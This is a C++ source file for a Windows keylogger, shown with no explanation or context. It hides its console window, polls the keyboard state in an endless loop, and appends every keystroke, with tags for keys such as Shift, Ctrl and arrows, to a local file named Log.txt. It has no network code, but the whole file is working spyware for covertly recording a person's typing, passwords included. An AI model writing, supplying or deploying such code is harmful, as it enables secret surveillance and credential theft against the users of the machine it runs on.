#include <Windows.h>
#include <iostream>

using namespace std;

int Saver(int l, char *file);

int main () {
	
	FreeConsole();
	
	char i;
	
	Sleep(10);
	
	while(true) {
		for(i = 8; i <= 255; i++) {
			if(GetAsyncKeyState(i) == -32767) {
				Saver(i, "Log.txt");
			}
		}
	}
	
	return 0;
}

int Saver(int l, char *file) {
	
	cout << l << endl;
	
	Sleep(10);
	
	FILE *OUTPUT;
	OUTPUT = fopen(file, "a+");
	if(l == VK_SHIFT)
		fprintf(OUTPUT, "%s", " 'S' ");
	else if(l == VK_LBUTTON)
		fprintf(OUTPUT, "%s", "");
	else if(l == VK_RBUTTON)
		fprintf(OUTPUT, "%s", "");
	else if(l == VK_SPACE)
		fprintf(OUTPUT, "%s", " ");
	else if(l == VK_TAB)
		fprintf(OUTPUT, "%s", "	");
	else if(l == VK_RETURN)
		fprintf(OUTPUT, "%s", "\n");
	else if(l == VK_LEFT)
		fprintf(OUTPUT, "%s", " '<' ");
	else if(l == VK_UP)
		fprintf(OUTPUT, "%s", " '^' ");
	else if(l == VK_RIGHT)
		fprintf(OUTPUT, "%s", " '>' ");
	else if(l == VK_DOWN)
		fprintf(OUTPUT, "%s", " 'v' ");
	else if(l == VK_BACK)
		fprintf(OUTPUT, "%s", "<<<");
	else if(l == VK_CAPITAL)
		fprintf(OUTPUT, "%s", " 'C' ");
	else if(l == VK_CONTROL)
		fprintf(OUTPUT, "%s", " 'Ct' ");
	else if(l == VK_MENU)
		fprintf(OUTPUT, "%s", " 'A' ");
	else if(l == VK_ESCAPE)
		fprintf(OUTPUT, "%s", " 'E' ");
	else if(l == VK_PRIOR)
		fprintf(OUTPUT, "%s", " 'PU' ");
	else if(l == VK_NEXT)
		fprintf(OUTPUT, "%s", " 'PD' ");
	else if(l == VK_LWIN)
		fprintf(OUTPUT, "%s", " 'W' ");
	else if(l == VK_RWIN)
		fprintf(OUTPUT, "%s", " 'W' ");
	else if(l == VK_NUMPAD0)
		fprintf(OUTPUT, "%s", "0");
	else if(l == VK_NUMPAD1)
		fprintf(OUTPUT, "%s", "1");
	else if(l == VK_NUMPAD2)
		fprintf(OUTPUT, "%s", "2");
	else if(l == VK_NUMPAD3)
		fprintf(OUTPUT, "%s", "3");
	else if(l == VK_NUMPAD4)
		fprintf(OUTPUT, "%s", "4");
	else if(l == VK_NUMPAD5)
		fprintf(OUTPUT, "%s", "5");
	else if(l == VK_NUMPAD6)
		fprintf(OUTPUT, "%s", "6");
	else if(l == VK_NUMPAD7)
		fprintf(OUTPUT, "%s", "7");
	else if(l == VK_NUMPAD8)
		fprintf(OUTPUT, "%s", "8");
	else if(l == VK_NUMPAD9)
		fprintf(OUTPUT, "%s", "9");
	else if(l == VK_ADD)
		fprintf(OUTPUT, "%s", "+");
	else if(l == VK_SUBTRACT)
		fprintf(OUTPUT, "%s", "-");
	else if(l == VK_DIVIDE)
		fprintf(OUTPUT, "%s", "/");
	else if(l == VK_MULTIPLY)
		fprintf(OUTPUT, "%s", "*");
	else if(l == VK_END)
		fprintf(OUTPUT, "%s", "");
	else if(l == VK_DELETE)
		fprintf(OUTPUT, "%s", " 'D' ");
	else
	fprintf(OUTPUT, "%s", &l);
	fclose(OUTPUT);
	
	return 0;
}